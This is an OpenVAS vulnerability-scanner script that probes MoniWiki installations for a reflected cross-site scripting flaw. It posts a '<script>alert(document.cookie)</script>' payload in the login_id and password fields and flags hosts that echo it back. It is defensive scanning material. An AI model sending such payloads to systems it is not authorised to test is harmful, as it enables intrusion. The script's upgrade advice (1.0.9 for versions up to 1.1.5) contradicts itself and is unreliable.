###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_moniwiki_login_xss_vuln.nasl 5950 2017-04-13 09:02:06Z teissa $
#
# MoniWiki 'login_id' Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902794");
  script_version("$Revision: 5950 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-13 11:02:06 +0200 (Thu, 13 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-02-21 17:36:32 +0530 (Tue, 21 Feb 2012)");
  script_name("MoniWiki 'login_id' Cross-Site Scripting Vulnerability");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/48109");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/17835");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/48109");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109902/moniwiki-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.

  Impact Level: Application");
  script_tag(name : "affected" , value : "MoniWiki version 1.1.5 and prior.");
  script_tag(name : "insight" , value : "The flaw is due to an input passed to the 'login_id' POST
  parameter in 'wiki.php' (when 'action' is set to 'userform') is not properly
  sanitised before being returned to the user.");
  script_tag(name : "solution" , value : "Upgrade to MoniWiki 1.0.9 or later,
  For updates refer to http://moniwiki.kldp.net/wiki.php");
  script_tag(name : "summary" , value : "This host is running MoniWiki and is prone to cross site scripting
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";
monRes = "";
dir = "";

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

foreach dir (make_list_unique("/moniwiki", "/MoniWiki", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/wiki.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## confirm the application
  if(rcvRes && "powered by MoniWiki" >< rcvRes)
  {
    ## Construct attack
    postdata = "action=userform&login_id=<script>alert(document.cookie)" +
               "</script>&password=<script>alert(document.cookie)</script>";

    monReq = string("POST ", dir, "/wiki.php/FrontPage HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n",
                    "\r\n", postdata);

    monRes = http_keepalive_send_recv(port:port, data:monReq);

    ## Confirm exploit worked properly or not
    if(monRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< monRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
